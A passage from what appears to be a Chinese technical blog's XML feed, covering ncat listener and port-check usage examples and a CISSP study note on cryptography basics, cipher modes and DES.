10.2.2.63: Connection refusedtelnet: Unable to connect to remote host监听连接[root@nvm-14yhwwkhnu5v0 ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52072.2、监听多线程443[root@nvm-14yhwwkhnu5v0 ~]# ncat -lvkp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443第一个连接➜  ~ telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.第二个连接➜  /tmp telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.监听连接[root@nvm-14yhwwkhnu5v0 ~]# ncat -lvkp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52190.Ncat: Connection from 10.222.28.6.Ncat: Connection from 10.222.28.6:52191.</code></pre><h3 id="w-–wait"><a href="#w-–wait" class="headerlink" title="-w –wait &lt;time&gt;"></a>-w –wait &lt;time&gt;</h3><p>Connect timeout</p><p>设置连接超时时间</p><h3 id="z-x20"><a href="#z-x20" class="headerlink" title="-z&#x20;"></a>-z&#x20;</h3><p>Zero-I&#x2F;O mode, report connection status only</p><p>没有任何输入输出的模式，只有在扫描通信端口时使用</p><h3 id="n-–nodns"><a href="#n-–nodns" class="headerlink" title="-n –nodns"></a>-n –nodns</h3><p>Do not resolve hostnames via DNS</p><p>不使用DNS解析主机名</p><h2 id="常见示例"><a href="#常见示例" class="headerlink" title="常见示例"></a>常见示例</h2><h3 id="监听UDP端口"><a href="#监听UDP端口" class="headerlink" title="监听UDP端口"></a>监听UDP端口</h3><pre><code class="hljs">ncat --listen --udp 443</code></pre><h3 id="扫描端口开放情况"><a href="#扫描端口开放情况" class="headerlink" title="扫描端口开放情况"></a>扫描端口开放情况</h3><h4 id="TCP端口"><a href="#TCP端口" class="headerlink" title="TCP端口"></a>TCP端口</h4><pre><code class="hljs">nc -zvw time(s) IP sport-eport</code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cissp-密码学和对称密钥算法</title>
    <link href="/2024/12/27/security/seccert/cissp/cissp-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E7%AE%97%E6%B3%95/"/>
    <url>/2024/12/27/security/seccert/cissp/cissp-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>密码可为已存储（<strong>静态</strong>）、通过网络传输（<strong>传输中&#x2F;动态</strong>）和存在于内存（<strong>使用中&#x2F;处理中</strong>）的敏感信息提供<strong>保密性</strong>、<strong>完整性</strong>、<strong>身份认证</strong>和<strong>不可否认性</strong>保护</p><h2 id="密码学基本知识"><a href="#密码学基本知识" class="headerlink" title="密码学基本知识"></a>密码学基本知识</h2><h3 id="密码学的目标"><a href="#密码学的目标" class="headerlink" title="密码学的目标"></a>密码学的目标</h3><h4 id="保密性confidentiality"><a href="#保密性confidentiality" class="headerlink" title="保密性confidentiality"></a>保密性confidentiality</h4><h5 id="保密性目标"><a href="#保密性目标" class="headerlink" title="保密性目标"></a>保密性目标</h5><p>确保数据在静态、传输中和使用中等三种不同状态下始终保持私密。</p><p>保密性是指为了存储的信息或个人和群体之间的通信保守秘密。</p><h5 id="保密性实现"><a href="#保密性实现" class="headerlink" title="保密性实现"></a>保密性实现</h5><h6 id="对称密码系统symmetric-cryptosystem"><a href="#对称密码系统symmetric-cryptosystem" class="headerlink" title="对称密码系统symmetric cryptosystem"></a>对称密码系统symmetric cryptosystem</h6><p>使用一个共享秘密密钥，提供给密码系统的所有用户。</p><h6 id="非对称密码系统asymmertric-cryptosystem"><a href="#非对称密码系统asymmertric-cryptosystem" class="headerlink" title="非对称密码系统asymmertric cryptosystem"></a>非对称密码系统asymmertric cryptosystem</h6><p>使用为系统每个用户单独组合的公钥和私钥。</p><h5 id="保密性关注的数据"><a href="#保密性关注的数据" class="headerlink" title="保密性关注的数据"></a>保密性关注的数据</h5><h6 id="静态数据（data-at-rest）"><a href="#静态数据（data-at-rest）" class="headerlink" title="静态数据（data at rest）"></a>静态数据（data at rest）</h6><p>被存储的数据，是指驻留在一个永久位置上等待被访问的数据。</p><p>硬盘、备份磁带、云存储服务、USB装置和其他存储介质中的数据</p><p>容易受到物理设备盗窃的影响。</p><h6 id="动态数据（data-in-montion）"><a href="#动态数据（data-in-montion）" class="headerlink" title="动态数据（data in montion）"></a>动态数据（data in montion）</h6><p>线路上的数据（线路是指承载数据通信的网络电缆），是指正在两个系统之间通过网络传送的数据。</p><p>通过公司网络、无线网络或互联网传送的数据</p><p>容易受到窃听的影响。</p><h6 id="使用中的数据（data-in-use）"><a href="#使用中的数据（data-in-use）" class="headerlink" title="使用中的数据（data in use）"></a>使用中的数据（data in use）</h6><p>是指保存在计算机系统活跃内存中，可供系统中运行的进程访问的数据</p><p>容易受到未经授权的进程访问（如果操作系统没有适当隔离不同进程）</p><h4 id="完整性integrity"><a href="#完整性integrity" class="headerlink" title="完整性integrity"></a>完整性integrity</h4><h5 id="完整性目标"><a href="#完整性目标" class="headerlink" title="完整性目标"></a>完整性目标</h5><p>确保数据没有在未经授权的情况下被更改。</p><p>如果完整性机制正常运行，消息的接收者可确定，收到的消息和发出的消息相同。</p><p>完整性检查可确保被存储数据自创建起到被访问时不曾有过更改。</p><p>完整性控制抵御所有形式的更改，其中包括第三方试图插入假信息时进行的有意篡改、有意删除部分数据和因传输过程中的故障而发生的无意更改。</p><h5 id="完整性实现"><a href="#完整性实现" class="headerlink" title="完整性实现"></a>完整性实现</h5><p>通过使用加密的消息摘要来实现，也被称为数据签名（digital signature）</p><h6 id="公钥"><a href="#公钥" class="headerlink" title="公钥"></a>公钥</h6><h6 id="秘密密钥密码系统"><a href="#秘密密钥密码系统" class="headerlink" title="秘密密钥密码系统"></a>秘密密钥密码系统</h6><h4 id="身份认证authentication"><a href="#身份认证authentication" class="headerlink" title="身份认证authentication"></a>身份认证authentication</h4><h5 id="身份认证目标"><a href="#身份认证目标" class="headerlink" title="身份认证目标"></a>身份认证目标</h5><p>用于验证系统用户自称的身份，是密码系统的一项主要功能。</p><h4 id="不可否认性non-repudiation"><a href="#不可否认性non-repudiation" class="headerlink" title="不可否认性non-repudiation"></a>不可否认性non-repudiation</h4><h5 id="不可否认性目标"><a href="#不可否认性目标" class="headerlink" title="不可否认性目标"></a>不可否认性目标</h5><p>向接受者保证：消息发自发送者，而且没有人冒充发送者。</p><p>不可否认性还防止发送者声称自己绝对没有发送过消息（也叫否认消息）。</p><h5 id="不可否认性实现"><a href="#不可否认性实现" class="headerlink" title="不可否认性实现"></a>不可否认性实现</h5><p>公钥或非对称密钥系统提供</p><p>秘密密钥或对称密钥密码系统不提供不可否认性保障，因为参与者都是用的是共享密钥。</p><h3 id="密码学的概念"><a href="#密码学的概念" class="headerlink" title="密码学的概念"></a>密码学的概念</h3><h4 id="密码学术语"><a href="#密码学术语" class="headerlink" title="密码学术语"></a>密码学术语</h4><h5 id="明文消息P（plaintext）"><a href="#明文消息P（plaintext）" class="headerlink" title="明文消息P（plaintext）"></a>明文消息P（plaintext）</h5><h5 id="密文消息C（ciphertext）"><a href="#密文消息C（ciphertext）" class="headerlink" title="密文消息C（ciphertext）"></a>密文消息C（ciphertext）</h5><h5 id="加密（encrypt"><a href="#加密（encrypt" class="headerlink" title="加密（encrypt )"></a>加密（encrypt )</h5><h5 id="解密（decrypt）"><a href="#解密（decrypt）" class="headerlink" title="解密（decrypt）"></a>解密（decrypt）</h5><h5 id="密钥（key）"><a href="#密钥（key）" class="headerlink" title="密钥（key）"></a>密钥（key）</h5><p>所有的密码算法都靠密钥维持安全。</p><p>多数情况下，密钥是一个极大的二进制数。</p><p><strong>密钥空间</strong>：每种算法都有一个特定密钥空间（key space）。</p><p>密钥空间是一个特定的数值范围，而某一特定算法的密钥在这个范围内才有效。</p><p>密钥空间由位大小（bit size）决定，也就是密钥内二进制位（0 和 1）的数量。</p><p>密钥空间指的是从全 0 密钥到全 1 密钥的范围，也就是从 0 到 2 n 次方的数范围，其中 n 是密钥的位大小。</p><p>事实上，从密码得到的安全保护完全取决于为所用密钥保守秘密的能力。</p><h4 id="科克霍夫原则"><a href="#科克霍夫原则" class="headerlink" title="科克霍夫原则"></a>科克霍夫原则</h4><p>所有的密码都依赖算法，算法（algorithm）也就是一套规则，通常是数学规则，规定了加密和解密过程应该怎么进行。</p><p>科克霍夫原则（Kerckhoffs’s principle）也叫科克霍夫假说，只要密钥不被被人掌握，那么即便有关密码系统的一切都是公开的，密码系统也是安全的。</p><h4 id="私钥（也叫秘密密钥）密码系统"><a href="#私钥（也叫秘密密钥）密码系统" class="headerlink" title="私钥（也叫秘密密钥）密码系统"></a>私钥（也叫秘密密钥）密码系统</h4><p>所有参与者使用一个共享密钥</p><h4 id="公钥密码系统"><a href="#公钥密码系统" class="headerlink" title="公钥密码系统"></a>公钥密码系统</h4><p>每个参与者各有一个密钥对</p><h4 id="密码变量（cryptovariable）-密码密钥"><a href="#密码变量（cryptovariable）-密码密钥" class="headerlink" title="密码变量（cryptovariable）&#x3D;&#x3D; 密码密钥"></a>密码变量（cryptovariable）&#x3D;&#x3D; 密码密钥</h4><h4 id="密码术（cryptography）"><a href="#密码术（cryptography）" class="headerlink" title="密码术（cryptography）"></a>密码术（cryptography）</h4><p>创建和执行秘密代码和密码的技艺</p><h4 id="密码分析（cryptanalysis）"><a href="#密码分析（cryptanalysis）" class="headerlink" title="密码分析（cryptanalysis）"></a>密码分析（cryptanalysis）</h4><p>研究如何打败代码和密码</p><h4 id="密码学（cryptology）"><a href="#密码学（cryptology）" class="headerlink" title="密码学（cryptology）"></a>密码学（cryptology）</h4><p>密码术+密码分析</p><h4 id="密码系统（cryptosystem）"><a href="#密码系统（cryptosystem）" class="headerlink" title="密码系统（cryptosystem）"></a>密码系统（cryptosystem）</h4><p>一种代码或密码在硬件和软件中的具体实现</p><h3 id="密码数学"><a href="#密码数学" class="headerlink" title="密码数学"></a>密码数学</h3><h4 id="布尔数学（Boolean-mathermatics）"><a href="#布尔数学（Boolean-mathermatics）" class="headerlink" title="布尔数学（Boolean mathermatics）"></a>布尔数学（Boolean mathermatics）</h4><p>为用于构成任何计算机神经系统的位和字节定义了规则。</p><p>一般来说，计算机科学家把“开”状态称作真（true）值，把“关”状态称作假（false）值</p><p>0 &#x3D; FLASE</p><p>1 &#x3D; TRUE</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>密码学涉及的布尔数学利用各种逻辑函数来操控数据。</p><h5 id="AND（与）"><a href="#AND（与）" class="headerlink" title="AND（与）"></a>AND（与）</h5><p>“AND”运算（用符号“^”表示）检查两个值是否都真</p><p>比较两个变量每列中的值，当列中的值都为真时，输出值才为真</p><h5 id="OR（或）"><a href="#OR（或）" class="headerlink" title="OR（或）"></a>OR（或）</h5><p>“OR” 运算（用符号“v”表示）检查输入值中是否至少有一个为真</p><p>注意：</p><p>只有当两个值都为假时，OR 函数才返回一个假值</p><h5 id="NOT（非）"><a href="#NOT（非）" class="headerlink" title="NOT（非）"></a>NOT（非）</h5><p>“NOT”运算（用符号“~”表示），颠倒一个输入变量的值，也就是真变为假，假变为真。</p><p>注意：</p><p>NOT函数一次只在一个变量上运算。</p><h5 id="Exclusive-OR（异或）"><a href="#Exclusive-OR（异或）" class="headerlink" title="Exclusive OR（异或）"></a>Exclusive OR（异或）</h5><p>密码学中最重要和最常用的逻辑函数。</p><p>数学中将异或写成 XOR 函数，通常用符号 ⊕ 表示。</p><p>只有当一个输入值为真的时候，XOR 函数才返回一个真值。</p><p>两个值都为假或两个值都为真的时候，XOR 函数返回假值。</p><h4 id="模函数"><a href="#模函数" class="headerlink" title="模函数"></a>模函数</h4><p>模（modulo）函数在密码学领域极其重要。</p><p>模函数是一次除法运算之后留下的余数。</p><p>在等式中用缩写 “mod” 表示，或者用运算符“%”表示</p><h4 id="单向函数"><a href="#单向函数" class="headerlink" title="单向函数"></a>单向函数</h4><p>单向函数（one-way function）</p><p>是能方便地为输入的每种可能组合生成输出值的一种数学运算，但是这一运算会导致无法恢复输入值。</p><p>公钥密码系统全都建立在某种单向函数的基础之上。</p><p>但是实践从来没有证明，任何具体的已知单向函数确实是单向的，也就是说单向函数被破解的可能性在未来始终存在。</p><h4 id="nonce"><a href="#nonce" class="headerlink" title="nonce"></a>nonce</h4><p>密码常通过给加密过程添加随机性来获得强度。</p><p>使用nonce就是实现密码随机性的方法之一，nonce是一个随机数，可在数学函数中充当占位符变量，每次函数执行，nonce都会被一个在开始处理时生成的一次性随机数替换。</p><p>nonce每次被使用时都必须时一个唯一的数。</p><h5 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h5><p>零知识证明出现的情况：</p><p>一个人想要证明自己知道一个事实（如口令或密钥），但又不想把这个事实向另外一个人公开。可以通过复杂的数学运算实现，如离散对数和图论。</p><h5 id="分割知识"><a href="#分割知识" class="headerlink" title="分割知识"></a>分割知识</h5><p>职责分离和双人控制融于一个解决方案的做法叫分割知识（split knowledge）。例如：当执行某种操作所要求的信息或权限被分散到多名用户手中时，任何一个人都不会具有足够的权限来破坏环境的安全。</p><p>分割知识最佳案例：密钥托管（key escrow）概念。</p><p>采用密钥托管后，密码密钥会被交给一个第三方妥善保存。当满足某些条件时，第三方可以用托管密钥来恢复授权用户的访问权限或自行解密资料。这个第三方叫恢复代理（recovery agent）。</p><p>密钥托管方案中，单一恢复代理存在着欺诈和滥用权限的机会。</p><p><strong>N之取M控制</strong>（M of N Control）要求代理总数（N）中至少有M个代理同时在场才能执行高安全级别任务，M总是小于或等于N。</p><h5 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h5><p>用代价函数（work function）或代价因子从耗费成本和&#x2F;或时间的角度测算破解一个密码系统时需要付出的努力，从而衡量密码系统的强度。</p><p>密码系统提供的安全和保护与代价函数&#x2F;因子的值呈正比例关系，也就是说，包括密码保护在内的所有安全措施都应该是有成本效益和成本效率的。</p><p>密码系统挑选需要了解数据具有价值的时间长度、需要了解新涌现的技术可能对破解密码的努力产生什么影响。</p><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><h4 id="代码与密码"><a href="#代码与密码" class="headerlink" title="代码与密码"></a>代码与密码</h4><p><strong>代码</strong> code：由代表单词和短语的符号够成的密码系统。尽管代码有时候时保密的，但它们并不一定提供保密性保护。例如：莫尔斯电码、旗语</p><p><strong>密码</strong> cipher：始终要隐藏消息的真实含义。</p><p>密码通过各种技术手段更改和&#x2F;或重新排列消息的字符或位，以实现保密性。</p><p>密码以位（即一个个位二进制代码）、字符（即ASCII消息的单个字符）或块（即消息的一个固定片段，通常以位数表示）为单位将消息从明文变成密文。</p><p><strong>代码和密码的区别</strong></p><p>代码作用于单词和短语</p><p>密码作用于字符、位和块</p><h4 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h4><p>移位密码（transposition cipher ）通过一种加密算法重新排列明文消息的字母，形成密文消息。解密算法只需要逆向执行加密位移便可恢复原始消息。</p><h4 id="替换密码"><a href="#替换密码" class="headerlink" title="替换密码"></a>替换密码</h4><p>替换密码（substitution cipher）通过加密算法用一个不同的字符替换明文消息的每个字符或位。</p><p>常见替换密码：单表替换（凯撒密码）、多表替换（Vigenere密码）</p><h5 id="单表替换（凯撒密码）"><a href="#单表替换（凯撒密码）" class="headerlink" title="单表替换（凯撒密码）"></a>单表替换（凯撒密码）</h5><p>凯撒密码（Caesar cipher）也被称为 ROT3（或Rotate 3，轮转 3），也就是将字母表上的每个字母向右移 3 位。</p><p>注意：凯撒密码采用的是 3 字母移位，在实际使用过程中，可根据使用者需求，用相同的算法移位任意数量的字母，例如，ROT 12，向右移动 12 位。</p><p>警告：凯撒密码易于使用，也易于破解。频率分析（frequency analysis）攻击进行破解。由于英语语言中使用最频繁的字母是 E、T、A、O、N、R、I、S 和 H，攻击者在被加密的文本中找出最常用的字母，然后尝试替换这些常用字母，便可实现对使用凯撒密码加密的英文消息破解。</p><p>凯撒密码的加密函数：</p><p>C &#x3D; (P + 3) mod 26</p><p>凯撒密码的解密函数：</p><p>P &#x3D; （C - 3）mod 26</p><h5 id="多表替换（Vigenere密码）"><a href="#多表替换（Vigenere密码）" class="headerlink" title="多表替换（Vigenere密码）"></a>多表替换（Vigenere密码）</h5><p>多表替换密码在同一条消息中使用多个字母表。</p><p>多表替换密码系统的著名案例是 Vigenere 密码系统 。</p><p>多表替换可以抵御直接频率分析，但是无法抵御周期分析（period analysis）的二阶式频率分析攻击，也就是根据密钥的重复使用情况进行频率分析。</p><h4 id="单次密本-Vernam密码"><a href="#单次密本-Vernam密码" class="headerlink" title="单次密本 Vernam密码"></a>单次密本 Vernam密码</h4><p>单次密本（one-time pad）是及其强力的一种替换密码。</p><p>单次密本为明文消息中的每个字母使用一个不同的替换字母表。</p><p>加密函数表示：</p><p>K是用于将明文字母P加密成密文字母C的加密密钥</p><p>C &#x3D; （P + K）mod 26</p><p><strong>单次密本优势</strong>：</p><p>如果使用得当，将是不可破解的</p><p><strong>保证算法完整性要求：</strong></p><p>1、<strong>单次密本必须随机生成</strong>。若使用从一本书中摘取的短语或段落，使得密码分析者有机会破解。</p><p>2、<strong>单次密本必须处于物理保护之下，以防泄露</strong>。敌人如果拿到密本拷贝，即可轻易破解加密消息。</p><p><strong>凯撒密码、Vigenere密码和单次密本相似度</strong></p><p>三者唯一区别是密钥长度不同，凯撒密码密钥长度为 1，Vigenere密码使用的密钥长一些（通常是一个词或一句话），单次密本使用的密钥和消息本身一样长。</p><p>3、<strong>每个单次密本必须只使用一次</strong>。如果重复使用密本，存在密码分析者通过对使用同一密本加密消息的比较分析出密钥值的可能性。</p><p>常见做法为使用完密钥后将密本销毁，避免重复使用。</p><p>4、密钥必须至少与将被加密的消息一样长。</p><p><strong>单次密本未推广使用原因</strong></p><p>难以生成、分发和保护所要求的冗长密钥。</p><p>单次密本只能用于较短的消息。</p><h4 id="运动密钥密码"><a href="#运动密钥密码" class="headerlink" title="运动密钥密码"></a>运动密钥密码</h4><p>使用运动密钥密码的原因：密码密钥长度有限，存在密码漏洞；单次密本需要物理交换密本，非常棘手。</p><p>运动密钥密码（running key cipher），也叫书密码（book cipher）。</p><p>运动密钥密码特点：</p><p>加密密钥与消息本身一样长</p><p>选自一部普通图书、一张报纸或一本杂志</p><h4 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h4><p>块密码（block cipher）在消息“块”上运算，在同一时间对整个消息执行加密算法。</p><p>移位算法是块密码的例子。</p><p>挑战-应答算法使用的简单算法提取整个词，然后反向排列词的字母。</p><h4 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h4><p>流密码（stream cipher）一次在消息（或消息流）的一个字符或一个位上运行。</p><p>凯撒密码是流密码的一个例子。</p><p>单次密本也是一种流密码。</p><p>流密码也可发挥某种类型块密码的作用。</p><h4 id="混淆和扩散"><a href="#混淆和扩散" class="headerlink" title="混淆和扩散"></a>混淆和扩散</h4><p>密码算法依靠两种基本运算-混淆（confusion）和扩散（diffusion）来隐藏明文信息。</p><p><strong>混淆运算</strong>：明文和密钥之间有着极复杂的关系，以至于攻击者不能只靠改动明文和分析结果密文来确定密钥。例如：替换。</p><p>扩散运算：明文中发生的一点变化会导致多个变化在整个密文中传播。例如：移位。</p><h2 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h2><p>现代密码系统通过<strong>复杂算法</strong>（在计算上和复杂的算法）和<strong>长密码密钥</strong>来实现密码学的<strong>保密性</strong>、<strong>完整性</strong>、<strong>身份认证</strong>和<strong>不可否认性</strong>目标。</p><h3 id="密码密钥"><a href="#密码密钥" class="headerlink" title="密码密钥"></a>密码密钥</h3><p>早期密码学依赖算法保密确保安全。</p><p>现代密码学依靠一个或多个密码密钥的保密性，而这些密钥将用于为特定用户或用户群体个性化定制算法。</p><p>密钥的长度与密码系统的代价函数直接相关：密钥越长，密码系统就越难被破解。</p><p>密钥管理实践规范：</p><p>1、长密钥</p><p>2、在预期的信息保密时间内保持密钥安全</p><p>3、始终安全地存储密钥，例如网络传输需要采取适当的方式确保安全性</p><p>4、尽可能以随机性高的方法选择密钥，充分利用整个密钥空间</p><p>5、当密钥不再被需要时，安全地将它们销毁</p><h3 id="对称密钥算法"><a href="#对称密钥算法" class="headerlink" title="对称密钥算法"></a>对称密钥算法</h3><p>对称密钥算法依靠一个分发给所有通信参与者的“共享秘密”加密密钥。</p><p>对称密钥加密法也叫秘密密钥密码（secret key cryptography）和私钥密码（private key cryptography）</p><p>当使用的密钥极大时，对称加密会变得非常难以破解，常用于进行海量加密，只提供保密性安全服务。</p><p>对称密钥会与只用于一次会话的短暂密钥一起使用，这种情况下使用的密钥被称为临时密钥（ephemeral key），最常见的例子是传输层安全（TLS）协议，用非对称密码建立一条加密信道，然后切换到使用临时密钥的对称密码。</p><p><strong>对称密钥加密法劣势</strong>：</p><p><strong>1、密钥分发是主要问题</strong>。使用之前需要找到一种安全的方式交换秘密密钥。如果没有现成的安全电子信道使用，需要采用一种安全的线下分发方法（即带外交换）。</p><p>2、对称密钥加密法不提供不可否认性。</p><p>3、算法缺乏可扩展性。</p><p>4、密钥必须经常重新生成。</p><p>每当有参与者离开通信群体时，该参与者知道的所有密钥都必须弃用。</p><p><strong>对称密钥加密法优势：</strong></p><p>1、运算速度非常快，往往比非对称加密算法快1000到10000倍。</p><p><strong>从数学的属性看使用场景</strong>：</p><p>对称加密更适合硬件执行，从而为更高速的运算创造机会</p><h3 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h3><p>非对称密钥算法（asymmetric key algorithm）可提供解决方案以消弭对称密钥加密的弱点。</p><p>公钥算法（public key algorithm）是非对称算法中最常用的例子。</p><p>非对称密钥系统中，每个用户都有两个密钥：一个是所有用户共享的公钥，另一个是只有用户自己知道并保守秘密的私钥。</p><p>非对称密钥算法的复杂性：公钥加密的消息，只有对应的私钥才可以解开。</p><p><strong>非对称密钥算法优势</strong>：</p><p>1、添加新用户时只需要生成一个公钥-私钥对，即可扩展性极高。</p><p>2、只需要在用户私钥失信的情况下重新生成密钥。</p><p>3、非对称密钥加密可提供完整性、身份认证和不可否认性。</p><p>4、密钥分发简便易行。对外只需要提供公钥。</p><p>5、不需要预先建立通信关联。</p><p><strong>非对称密钥算法劣势</strong>：</p><p>运算速度缓慢</p><p>针对这一原因，许多需要安全传输大量数据的应用先用公钥密码建立连接，以此交换一个对称秘密密钥，然后安排剩余的会话使用对称密钥加密法。这种既使用对称密钥，也适用非对称密钥的方法叫做混合密码（hybrid cryptography）。</p><p><strong>非对称密钥算法适用场景</strong>：</p><p>1、加密传输：公钥加密，私钥解密</p><p>2、数字签名技术：私钥加密，公钥解密</p><p>对称和非对称密码系统比较</p><table><thead><tr><th>对称</th><th>非对称</th></tr></thead><tbody><tr><td>单个共享密钥</td><td>密钥对集</td></tr><tr><td>带外交换</td><td>带内交换</td></tr><tr><td>不可扩展</td><td>可扩展</td></tr><tr><td>速度快</td><td>速度慢</td></tr><tr><td>大批量加密</td><td>小块数据、数字签名、数字封装、数字证书</td></tr><tr><td>保密性</td><td>保密性、完整性、身份认证、不可否认性（数字签名）</td></tr></tbody></table><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><p>消息摘要（也叫哈希值或指纹）是有哈希算法生成的消息内容归纳（与文件校验没什么不同）。</p><p>一个哈希函数为两种不同方法产生相同值的情况被称为碰撞（collision），而碰撞的存在通常会导致哈希算法贬值。</p><p>公钥密码系统与消息摘要配套使用可提供数字签名能力，从而实现密码的完整性和不可否认性目标。</p><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="密码运行模式"><a href="#密码运行模式" class="headerlink" title="密码运行模式"></a>密码运行模式</h3><p>密码的运行模式是指密码为实现抵御攻击的充分复杂度而采用的转换数据的不同方式。</p><p>密码的主要运行模式：</p><p>电子密码本（ECB）模式</p><p>密码块链接（CBC）模式</p><p>密码反馈（CFB）模式</p><p>输出反馈（OFB）模式</p><p>计数器（CTR）模式</p><p>Galois&#x2F;计数器（GCM）模式</p><p>带密码块链接消息验证码的计数器（CCM）模式</p><h4 id="电子密码本模式"><a href="#电子密码本模式" class="headerlink" title="电子密码本模式"></a>电子密码本模式</h4><p>电子密码本（Electronic Code Book，ECB）模式是最容易理解的简单模式，也是最不安全的模式。</p><p>算法每次处理一个64位块，只用选好的秘密密钥给块加密。</p><p>算法如果多次遇到同一个块，将会生成相同的加密块，存在利用密码分析破解加密方案的风险。</p><p>ECB模式只用来交换少量数据，例如用于启动其他密码模式的密钥和参数以及数据库的计算单元。</p><h4 id="密码块链接模式"><a href="#密码块链接模式" class="headerlink" title="密码块链接模式"></a>密码块链接模式</h4><p>在密码块链接（Cipher Block Chaining，CBC）模式中，每块未加密文本在被加密之前，都要先借助前面刚生成的密文块接受异或（XOR）运算。</p><p>解密流程只需要解密密文并进行反向异或运算。</p><p>CBC模式缺陷：错误传输的问题，如果一个块在传输过程中被破坏，那么这个块以及后面的块将无法解密。</p><h4 id="密码反馈模式"><a href="#密码反馈模式" class="headerlink" title="密码反馈模式"></a>密码反馈模式</h4><p>密码反馈（Cipher Feedback，CFB）模式是CBC模式的流密码版。换句话说，CFB针对实时生成的数据进行运算。</p><p>CFB模式不把消息分成块，而是使用与块大小相同的存储缓冲区。在缓冲区被填满时给数据加密，然后发送密文给接收者。</p><p>CFB使用实时数据，而不是原先就有的数据。</p><p>CFB和CBC采用的方式相同，都是使用一个IV，并且使用了链接。</p><h4 id="输出反馈模式"><a href="#输出反馈模式" class="headerlink" title="输出反馈模式"></a>输出反馈模式</h4><p>输出反馈（Output Feedback，OFB）模式，密码以与CFB模式几乎完全相同的方式运行。</p><p>与CFB的区别在于：</p><p>OFB不是对前一个密文块的加密版进行异或运算，而是用一个种子值对明文进行异或。对于第一个被加密的块，OFB使用一个初始向量来创建种子值，后面的种子值则通过算法在前一个种子值的基础上运算得出。</p><p>OFB的优势：</p><p>不存在链接函数，传输错误不会传播，因而不会影响后面块的解密。</p><h4 id="计数器模式"><a href="#计数器模式" class="headerlink" title="计数器模式"></a>计数器模式</h4><p>计数器（Counter，CTR）模式使用了与CFB和OFB模式类似的流密码。</p><p>CTR的种子值不是在前一个种子值的基础上得来，而是利用一个简单的计数器为每次运算增量。</p><p>CTR的优势：</p><p>不存在链接函数，传输错误不会传播，因而不会影响后面块的解密。</p><h4 id="Galois-计数器模式"><a href="#Galois-计数器模式" class="headerlink" title="Galois&#x2F;计数器模式"></a>Galois&#x2F;计数器模式</h4><p>Galois&#x2F;计数器模式（Galois&#x2F;Counter Mode，GCM）采用标准CTR加密模式，并添加了数据真实性控制，可确保接收方所接收数据的完整性。这一点是通过向加密过程添加身份认证标记（authentication tag）来实现的。</p><h4 id="带密码块链接消息验证码的计数器模式"><a href="#带密码块链接消息验证码的计数器模式" class="headerlink" title="带密码块链接消息验证码的计数器模式"></a>带密码块链接消息验证码的计数器模式</h4><p>与GCM类似，带密码块链接消息验证码的计数器模式（CCM）把保密性模式与数据真实性流程结合在一起。</p><p>CCM密码把用于保证保密性的计数器（CTR）模式与用于保证数据真实性的块密码链接消息验证码（CBC-MAC）算法融为一体。</p><p>CCM只用于具有128位块长度并要求每次传输使用不同nonce的块密码。</p><p><strong>GCM和CCM，都包含了保密性和数据真实性，因此被称为经过验证的加密模式。</strong></p><p><strong>ECB、CBC、CFB、OFB、CTR模式只提供保密性，因此被称为未经验证的加密模式。</strong></p><h3 id="数据加密标准"><a href="#数据加密标准" class="headerlink" title="数据加密标准"></a>数据加密标准</h3><p>DES是一种64位块密码，共有5种运行模式：电子密码本（ECB）模式、密码块链接（CBC）模式、密码反馈（CFB）模式、输出反馈（OFB）模式和计数器（CTR）模式。</p><p>DES所有模式都是一次性在64位明文上进行运算，以生成64位密文块。</p><p>DES使用的密钥长度为56位。</p><p>DES通过长长的一系列异或（XOR）运算生成密文。这个过程会为每个加密&#x2F;解密操作重复16遍，每次重复通常称为一轮加密，因此有DES需要执行16轮加密的说法，每轮加密都生成一个新密钥，新密钥将被用作随后加密轮次的输入。</p><h3 id="三重DES"><a href="#三重DES" class="headerlink" 